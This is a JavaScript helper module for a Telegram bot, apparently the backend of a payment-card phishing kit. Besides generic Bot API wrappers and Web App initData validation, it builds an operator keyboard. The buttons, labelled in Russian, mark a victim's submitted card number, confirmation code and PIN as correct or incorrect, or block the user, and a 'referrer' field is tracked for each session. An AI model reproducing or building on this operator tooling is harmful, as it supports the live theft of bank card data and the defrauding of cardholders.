const crypto = require("crypto");
const CONFIG = require("./config");

const API = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;

async function sendMessage(chatId, text, options = {}) {
  const body = { chat_id: chatId, text, parse_mode: "HTML", ...options };
  const res = await fetch(`${API}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return res.json();
}

async function sendPhoto(chatId, photo, caption, options = {}) {
  const body = {
    chat_id: chatId,
    photo,
    caption,
    parse_mode: "HTML",
    ...options,
  };
  const res = await fetch(`${API}/sendPhoto`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return res.json();
}

async function answerCallbackQuery(id, text = "") {
  const body = { callback_query_id: id, text };
  await fetch(`${API}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function editMessageText(chatId, messageId, text, replyMarkup = null) {
  const body = {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  else body.reply_markup = { inline_keyboard: [] };
  await fetch(`${API}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

function validateInitData(initData) {
  if (!initData) return null;
  try {
    const params = new URLSearchParams(initData);
    const hash = params.get("hash");
    if (!hash) return null;
    params.delete("hash");

    const dataCheckString = [...params.entries()]
      .sort(([a], [b]) => a.localeCompare(b))
      .map(([k, v]) => `${k}=${v}`)
      .join("\n");

    const secretKey = crypto
      .createHmac("sha256", "WebAppData")
      .update(CONFIG.BOT_TOKEN)
      .digest();
    const calculated = crypto
      .createHmac("sha256", secretKey)
      .update(dataCheckString)
      .digest("hex");

    if (calculated !== hash) return null;

    const userStr = params.get("user");
    return userStr ? JSON.parse(userStr) : null;
  } catch {
    return null;
  }
}

function formatUserInfo(session) {
  let info = "";
  info += `🆔 ID: <code>${session.userId}</code>\n`;
  if (session.username) info += `👤 Username: @${session.username}\n`;
  if (session.firstName) info += `📝 Имя: ${session.firstName}\n`;
  if (session.referrer) info += `👥 Пригласил: ${session.referrer}\n`;
  return info;
}

function adminKeyboard(step, userId) {
  const labels = {
    card: ["✅ Карта верна", "❌ Карта не верна", "🚫 Заблокировать"],
    code: ["✅ Код верный", "❌ Код не верный", "🚫 Заблокировать"],
    pin: ["✅ Код верный", "❌ Код не верный", "🚫 Заблокировать"],
  };
  const l = labels[step];
  return {
    inline_keyboard: [
      [
        { text: l[0], callback_data: `ok_${step}_${userId}` },
        { text: l[1], callback_data: `no_${step}_${userId}` },
      ],
      [{ text: l[2], callback_data: `ban_${step}_${userId}` }],
    ],
  };
}

module.exports = {
  sendMessage,
  sendPhoto,
  answerCallbackQuery,
  editMessageText,
  validateInitData,
  formatUserInfo,
  adminKeyboard,
};
